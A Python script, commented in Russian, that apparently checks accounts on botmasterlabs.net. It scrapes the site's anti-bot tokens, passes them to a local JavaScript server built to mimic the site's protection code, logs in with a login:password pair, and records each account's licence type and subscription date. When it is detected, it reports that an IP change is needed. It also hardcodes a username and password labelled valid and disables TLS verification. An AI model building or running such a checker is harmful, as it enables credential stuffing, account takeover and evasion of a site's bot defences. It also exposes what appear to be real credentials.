try:
    import requests
    from loguru import logger
except ImportError as e:
    print(e)
    input("Enter to exit...")
    exit()

'''
Я использую JS сервер который копирует поведение сайта
Вместо долгого и муторного изучения полного поведения JS кода
Я изучил часть, скачал все нужные js файлы сайта и скормил ИИ + отдебажил, чтобы
более быстро исправить мелкие части кода, которые не работают без сайта
и использовать JS сервер для генерации тех же данных, что и сайт

Также я использую только необходимые заголовки запросов для упрощения кода 
(найдены ручной проверкой, после уже успешной работы чека), 
но сайт в любой момент может начать проверять остальные 

В случае подозрения сайта на автоматизацию он отдает нулевой sg_rep.text с рандомным status_code + долгий ответ сервера
'''

# Тестовые данные, валид
login = 'scarletbabette'
password = 'qwertqwert'

error_messages = {
    "l": "Логин",
    "p": "Пароль",
    "eConnection": "Сервер недоступен",
    "eServer": "Ошибка, код ",
    "eLPass": "Неверный логин и/или пароль",
    "eL": "Пользователь не найден",
    "eR": "Пожалуйста, обновите страницу",
    "eNo": "Пожалуйста, укажите ",
    "eNoName": "Вы не указали своё Имя.",
    "eNoEmail": "Не указан E-mail.",
    "eNoMessage": "Не заполнено поле для сообщения.",
    "eNoChgMessage": "Пожалуйста, укажите желаемый метод оплаты.",
    "x": 0
}

session = requests.Session()
session.verify = False

headers = {
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
}
botmasterlabs_resp = session.get('http://www.botmasterlabs.net/', headers=headers)

# Парсим данные для js сервера (защита сайта)
a = botmasterlabs_resp.text.split('au("')[1].split('"')[0]
randm = botmasterlabs_resp.text.split('randm=')[1].split('&')[0]
sec = botmasterlabs_resp.text.split('sec=')[1].split('"')[0]
d = botmasterlabs_resp.text.split('data-')[1].split('"')[1].split('"')[0]

# Создаем локальную сессию, чтобы общаться с js сервером, в случае если будем использовать на основной сессии прокси
local_session = requests.Session()
data = {
    'a': a,
    'u': f'/sg.php?randm={randm}&sec={sec}',
    'login': login,
    'password': password,
    'd1': d,
}
au_resp = local_session.post('http://localhost:3000/au', json=data)
au_json = au_resp.json()

headers = {
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
}
data = {
    'l': au_json['l'],
    's': au_json['s'],
    'd': au_json['d'],
    'p': au_json['p'],
}
sg_resp = session.post(
    f"http://www.botmasterlabs.net/sg.php?randm={randm}&sec={sec}", data=data, headers=headers,
)

if sg_resp.text.startswith(')'):
    uri = sg_resp.text.split(')window.location.href="')[1].split('"')[0]
    url = f'http://www.botmasterlabs.net{uri}'
    user_panel_resp = session.get(url, headers=headers)
    try:
        subscription = 'Your subscription paid till: ' + user_panel_resp.text.split('Your subscription paid till:  ')[1].split('</h4>')[0]
    except:
        subscription = 'Ended'

    try:
        license_type = 'License type: ' + user_panel_resp.text.split('License type: <strong>')[1].split('</strong>')[0].replace('&nbsp;', ' ')
    except:
        license_type = 'License type: Xevil 5'

    logger.success(f"{login}:{password} | {license_type} | {subscription}")

elif 'loadingErrorSay' in sg_resp.text:
    error_key = sg_resp.text.split(',"', 1)[1].split('"')[0]
    error_message = error_messages.get(error_key, f'Invalid error key "{error_key}"')
    logger.error(f"{error_message} | {login}:{password}")

elif not sg_resp.text:
    logger.error(f'Необходима смена IP {sg_resp.status_code}')

else:
    logger.error(f"Неизвестная ошибка: {sg_resp.text}")

input("Enter to exit...")
